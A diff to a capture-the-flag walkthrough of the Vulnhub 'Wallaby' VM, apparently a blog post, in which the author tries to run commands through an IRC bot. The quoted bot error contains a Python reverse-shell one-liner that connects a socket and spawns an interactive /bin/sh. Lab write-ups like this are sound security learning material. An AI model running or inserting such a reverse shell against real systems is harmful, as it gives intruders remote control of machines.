@@ -301,7 +301,7 @@ Aha, it's a Python bot. Time to see what I can do now that I'm `waldo` through a
 Sopel is My Friend
 ------------------
 
-In using the bot, I find some difficulty with running bash or Python commands. They're all erroring out, and I'm starting to think it's the bot itself. I can do simple commands like `whoami` and `pwd` but it can't execute past that.
+In using the bot, I find some difficulty with running bash or Python commands. They're all erroring out; I can do simple commands like `whoami` and `pwd` but it can't execute past that. Flags and commands past the first get dropped.
 
 ```
 <wallabysbot> FileNotFoundError: [Errno 2] No such file or directory: 'python -c \'import
@@ -309,3 +309,5 @@ socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 ); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' (file
 "/usr/lib/python3.5/subprocess.py", line 1551, in _execute_child)
 ```
+
+Escaping special characters doesn't work, either. Here I am in a Vulnhub VM trying to hack, and I'm having to admin instead.
